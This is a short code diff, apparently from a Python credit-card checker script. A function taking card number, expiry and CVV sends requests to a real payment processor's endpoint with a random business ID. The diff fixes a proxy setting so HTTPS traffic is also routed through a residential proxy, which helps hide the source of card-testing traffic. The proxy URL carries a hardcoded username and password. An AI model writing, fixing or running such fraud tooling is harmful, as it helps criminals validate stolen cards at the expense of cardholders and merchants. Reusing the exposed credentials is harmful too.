@@ -456,7 +456,7 @@ def checker(card, month, year, cvv):
         
         
         if response.status_code == 200:
-            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225'}
+            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225'}
             start_time = time.time() 
             key = rkey()
             url = f"https://www.payzer.com/Payment/ExternalMake/businessId/{key}"
